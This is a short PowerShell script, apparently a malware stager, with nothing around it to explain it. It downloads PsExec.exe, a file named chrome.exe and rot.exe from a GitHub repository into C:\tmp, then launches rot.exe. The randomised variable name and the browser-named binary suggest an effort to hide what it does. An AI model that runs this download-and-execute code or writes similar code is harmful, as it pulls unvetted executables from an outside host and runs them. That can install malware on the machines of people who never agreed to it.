$fSiOVdcl99 = new-object System.Net.WebClient
$fSiOVdcl99.DownloadFile('https://github.com/Ccgnnz19/shekksl/raw/main/PsExec.exe','C:\tmp\PsExec.exe')
$fSiOVdcl99.DownloadFile('https://github.com/Ccgnnz19/shekksl/raw/main/chrome.exe','C:\tmp\chrome.exe')
$fSiOVdcl99.DownloadFile('https://github.com/Ccgnnz19/shekksl/raw/main/rot.exe','C:\tmp\rot.exe')
Start-Process -FilePath "C:\tmp\rot.exe"